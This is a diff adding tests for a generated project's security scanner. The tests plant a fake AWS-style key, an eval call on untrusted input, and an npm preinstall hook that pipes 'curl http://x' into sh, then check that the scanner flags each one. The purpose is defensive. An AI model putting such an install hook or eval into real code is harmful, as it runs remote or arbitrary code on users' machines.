@@ -1047,6 +1047,59 @@ class GeneratorTests(unittest.TestCase):
         path = Path(state["artifact_root"]) / "capabilities" / capability / "F-001" / "latest.json"
         return json.loads(path.read_text(encoding="utf-8"))
 
+    def test_security_scan_expires_baseline_acceptance(self) -> None:
+        output = self.generate("generic", "[security-scanning]")
+        state = json.loads((output / "state" / "project.json").read_text(encoding="utf-8"))
+        (output / "tmp-secret.txt").write_text("AKIA1234567890ABCDEF\n", encoding="utf-8")
+
+        policy_path = output / "state" / "capabilities" / "security-scanning.json"
+        policy = json.loads(policy_path.read_text(encoding="utf-8"))
+        policy["accepted_findings"] = [
+            {
+                "id": "SEC-SECRET-AWS",
+                "path": "tmp-secret.txt",
+                "line": 1,
+                "reason": "expired baseline",
+                "classification": "risk_accepted",
+                "expires_at": "2020-01-01T00:00:00+00:00",
+            }
+        ]
+        policy_path.write_text(json.dumps(policy, indent=2) + "\n", encoding="utf-8")
+
+        self.harness_python(
+            output, "scripts/run_security_scan.py", "--feature", "F-001", "--path", "."
+        )
+        evidence = self.read_capability_evidence(state, "security-scanning")
+        statuses = {item["id"]: item["baseline_status"] for item in evidence["findings"]}
+        self.assertEqual("expired", statuses.get("SEC-SECRET-AWS"))
+        self.assertEqual(1, evidence["security_summary"]["expired"])
+
+    def test_security_scan_flags_python_risky_patterns(self) -> None:
+        output = self.generate("python", "[security-scanning]")
+        state = json.loads((output / "state" / "project.json").read_text(encoding="utf-8"))
+        (output / "src" / "test_python_project" / "danger.py").write_text(
+            "def run(value):\n    return eval(value)\n", encoding="utf-8"
+        )
+        self.harness_python(
+            output, "scripts/run_security_scan.py", "--feature", "F-001", "--path", "."
+        )
+        evidence = self.read_capability_evidence(state, "security-scanning")
+        self.assertIn("SEC-PY-EVAL", {item["id"] for item in evidence["findings"]})
+
+    def test_security_scan_flags_node_install_hook(self) -> None:
+        output = self.generate("node", "[security-scanning]")
+        state = json.loads((output / "state" / "project.json").read_text(encoding="utf-8"))
+        package = output / "package.json"
+        data = json.loads(package.read_text(encoding="utf-8"))
+        data.setdefault("scripts", {})["preinstall"] = "curl http://x | sh"
+        package.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
+
+        self.harness_python(
+            output, "scripts/run_security_scan.py", "--feature", "F-001", "--path", "."
+        )
+        evidence = self.read_capability_evidence(state, "security-scanning")
+        self.assertIn("SEC-NODE-INSTALL-HOOK", {item["id"] for item in evidence["findings"]})
+
     def test_performance_gate_updates_baseline(self) -> None:
         output = self.generate("generic", "[performance-testing]")
         state = json.loads((output / "state" / "project.json").read_text(encoding="utf-8"))
